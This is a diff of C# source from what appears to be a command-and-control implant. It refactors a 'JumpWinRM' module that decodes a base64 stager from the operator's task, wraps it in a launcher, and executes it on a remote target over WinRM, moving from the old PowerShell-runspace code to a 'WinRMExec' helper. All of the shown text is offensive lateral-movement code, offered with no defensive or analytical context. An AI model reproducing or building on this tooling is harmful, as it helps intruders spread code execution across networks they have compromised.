@@ -6,8 +6,6 @@ using Shared.Models;
 
 using System;
 using System.Collections.Generic;
-using System.Management.Automation;
-using System.Management.Automation.Runspaces;
 
 namespace Agent.Modules
 {
@@ -42,33 +40,18 @@ namespace Agent.Modules
 
         void JumpWinRM(string AgentID, AgentTask Task)
         {
-            var target = (string)Task.Parameters["Target"];
-            var stager = Convert.FromBase64String((string)Task.Parameters["Assembly"]);
-
-            var launcher = GenerateLauncher(stager);
-
-            var uri = new Uri($"http://{target}:5985/WSMAN");
-            var connection = new WSManConnectionInfo(uri);
-
-            using (var runspace = RunspaceFactory.CreateRunspace(connection))
+            try
             {
-                try
-                {
-                    runspace.Open();
+                var target = (string)Task.Parameters["Target"];
+                var stager = Convert.FromBase64String((string)Task.Parameters["Assembly"]);
+                var launcher = GenerateLauncher(stager);
 
-                    using (var ps = PowerShell.Create())
-                    {
-                        ps.Runspace = runspace;
-                        ps.AddScript(launcher);
-                        ps.Invoke();
-                    }
-                }
-                catch (Exception e)
-                {
-                    Agent.SendError(e.Message);
-                }
-
-                runspace.Close();
+                var winrm = new WinRMExec(target);
+                winrm.Execute(launcher);
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
             }
         }
 
